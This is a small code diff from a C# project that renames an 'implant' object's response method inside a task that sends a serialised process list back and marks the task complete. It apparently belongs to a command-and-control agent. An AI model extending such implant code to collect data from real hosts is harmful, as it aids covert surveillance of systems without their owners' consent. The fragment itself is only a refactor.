@@ -24,7 +24,7 @@ namespace SaltedCaramel.Tasks
             processResult.Clear();
 
             SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(procList), task.id);
-            implant.SCPostResp(response);
+            implant.PostResponse(response);
             implant.SendComplete(task.id);
         }
     }
